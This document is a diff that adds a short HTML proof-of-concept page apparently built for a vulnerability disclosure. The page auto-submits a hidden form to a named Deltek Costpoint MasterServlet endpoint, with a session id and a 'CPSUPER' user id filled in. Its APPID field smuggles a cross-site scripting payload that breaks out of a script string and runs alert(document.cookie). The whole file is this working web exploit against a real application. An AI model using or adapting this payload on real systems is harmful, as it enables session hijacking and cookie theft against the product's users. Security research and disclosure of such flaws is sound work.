@@ -1,0 +1,16 @@
+<html>
+  <body>
+    <form id="xssForm" action="https://custcareep-cpd.deltekenterprise.com/cpweb/MasterServlet.cps" method="POST">
+      <input type="hidden" name="DOWNLOADREQ" value="download">
+      <input type="hidden" name="SYSTEM" value="CUSTCAREEPDEV">
+      <input type="hidden" name="COMPANYID" value="1">
+      <input type="hidden" name="USERID" value="CPSUPER">
+      <input type="hidden" name="APPID" value='INPUID")); alert(document.cookie);//'>
+      <input type="hidden" name="FILENAME" value="ASDASDAS">
+      <input type="hidden" name="sid" value="5d2082ec751645c897ac3802d76c1333">
+    </form>
+    <script>
+      document.getElementById("xssForm").submit();
+    </script>
+  </body>
+</html>
